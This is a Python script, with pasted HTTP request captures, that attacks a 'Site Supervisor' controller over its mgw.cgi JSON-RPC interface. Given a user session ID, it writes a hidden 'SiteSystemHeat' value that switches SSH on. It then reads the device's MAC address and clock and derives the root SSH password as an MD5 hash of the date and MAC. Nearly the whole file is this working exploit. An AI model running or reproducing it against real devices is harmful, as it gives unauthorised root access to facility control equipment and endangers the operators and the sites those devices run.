#!/usr/bin/python3

"""
“  This script needs Python3.x, and requests.
"  This script is for enable/disable SSH when the current Firmware is BATE or FIN
"  This is just for testing in our local, please don't publish it.
"  2017-11-30.
"""

import random
import requests
import json
import hashlib   #md5
import getpass
import time
import sys


#define the http head data members:
Http_header = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'
    }
print("This script will help us to enable Site Supervisor SSH, and try to get its password")



"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Thu, 30 Nov 2017 00:36:25 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:176
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"GetSystemInformation","params":{"sid":"9c55e5fd-9758-4beb-b181-f1e3819c7e62"},"id":"3"}
"""
def getSSVersion(ip, sessionid):
        base_url="http://" + ip + "/cgi-bin/mgw.cgi"
        icnt = random.randint(1000,10000)
        param = '{"jsonrpc":"2.0","method":"GetSystemInformation","params":{"sid":"' + sessionid + '"},"id":"' + str(icnt) +'"}'
        print(param)
        payload = {'m':param}
        try:
                rsq = requests.post(base_url, data=payload, headers= Http_header)
        except Exception:
                print("getVersion failed")
                return None
        print(rsq.text)
        decodejson = rsq.json()  #json.loads(rsq)
        if "" in decodejson:
                return None
        else:
                return decodejson['result']['unitversion']


"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Wed, 29 Nov 2017 02:54:35 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:174
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"GetSystemInventory","params":{"sid":"f0dd7640-de1a-45ef-ab1c-27c4590db238"},"id":"8"}
"""
def getAppslist(ip, sessionid):
        base_url="http://" + ip + "/cgi-bin/mgw.cgi"
        icnt = random.randint(1000,10000)
        param = '{"jsonrpc":"2.0","method":"GetSystemInventory","params":{"sid":"' + sessionid + '"},"id":"' + str(icnt) +'"}'
        print(param)
        payload = {'m':param}
        rsq = requests.post(base_url, data=payload, headers= Http_header)
        print(rsq.text)
        decodejson = rsq.json(); #json.loads(rsq)
       	#print decodejson['result']['aps']
       	return decodejson['result']['aps']


"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Wed, 29 Nov 2017 02:53:48 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:274
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"9c55e5fd-9758-4beb-b181-f1e3819c7e62","points":[{"ptr":"3470709668:SystemTime","val":"1511924026"}]},"id":"101"}
Name
SummaryDialog_tpl.html?_=2.05B00
mgw.cgi
mgw.cgi
"""
def setSiteSystemHeat(ip, sessionid, act_flag):
        #step 1: get the "System Settings" instance IID
        systemSetting_iid = ""
        apps_dict = getAppslist(ip, sessionid)
        for app in apps_dict:
                #if (app['appname'] == 'System Settings') or (app['appname'] == 'System Sett'):
                if (app['apptype'] == 'SystemSettings'):
                        systemSetting_iid = app['iid']
                        break

        #step 2: create "SetPointValues" message for http request.
        base_url="http://" + ip + "/cgi-bin/mgw.cgi"
        icnt = random.randint(1000,10000)
        if act_flag == '1':
                body_setHeat = '{"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':SiteSystemHeat","val":"69970925"}]},"id":"' + str(icnt) +'"}'
        else:
                body_setHeat = '{"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':SiteSystemHeat","val":"1234567890"}]},"id":"' + str(icnt) +'"}'

        print(body_setHeat)
        payload = {'m':body_setHeat}
        rsq = requests.post(base_url, data=payload, headers= Http_header)
        #print(rsq.text)
        decodejson = rsq.json() #json.loads(rsq)
        if "error" in decodejson :
                print("Error:", rsq.text)
        else:
            
                if act_flag == '1':
                        print(" ---> Enable the SSH finished.")
                else:
                        print(" ---> Disable the SSH finished.")
                        return 0;

                print(" ---> Next will try to get the root's passwrod:")
                base_url="http://" + ip + "/cgi-bin/mgw.cgi"
                icnt = random.randint(1000,10000)
                body_getMac0 = '{"jsonrpc":"2.0","method":"GetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':Eth0MacAddress"}, {"ptr":"' + systemSetting_iid + ':SystemTime"}]},"id":"' + str(icnt) +'"}'
                print(body_getMac0)
                payload = {'m':body_getMac0}
                rsq = requests.post(base_url, data=payload, headers= Http_header)
                print(rsq.text)
                decodejson = rsq.json() #json.loads(rsq)
                #print decodejson['result']['aps']
                members_info = decodejson['result']['points']

                mac_val = ""
                time_val = 0
                for val_inf in members_info:
                        tmpPtr = val_inf['ptr']
                        if (tmpPtr.find('Eth0MacAddress') > 0):
                                mac_val = val_inf['val']
                        elif (tmpPtr.find('SystemTime') > 0):
                                time_val = val_inf['val']
                        
                #print mac_val, time_val
                date_now = time.gmtime(float(time_val))
                print(date_now)
                #print date_now.tm_year
                #print date_now.tm_mon
                print(time.altzone)
                print(time.asctime(time.gmtime(float(time_val))))
                md5sum_input = time.strftime("%Y-%m-%d", time.gmtime(float(time_val))) + "_" + mac_val
                print("Note:  please make sure your SS's time: ", time.strftime("%Y-%m-%d %H:%M", time.gmtime(float(time_val))))
                print("input: ", md5sum_input)
                print("You can try the passwword for SSh login: ", hashlib.md5(md5sum_input.encode()).hexdigest())


        
#main active:

if __name__ == "__main__":
        if (sys.version_info < (3,0)):
                print("This script needs Phthon3.x!" )
                sys.exit(0)

        SS_ip = input("\n ---> Please input your SS ip: ")
        #Sid = getSessionID(SS_ip)
        print ("\n You can get user's sid via Web UI/Browser.")
        Sid = input("---> Please input your user's sid: ")
        Version = getSSVersion(SS_ip, Sid)
        if (Version == None):
                print("something wrong.")
        else:
                if (Version.find("B") > 0  or Version.find("F") > 0 ):
                        act_flag = input("\n ---> Next choice enable(1)/disabel(0) SSH:")
                        setSiteSystemHeat(SS_ip, Sid, act_flag)
                else:
                        print (" ---> This Versin " + Version + " cannot be enabled/disabeled SSH!!!")

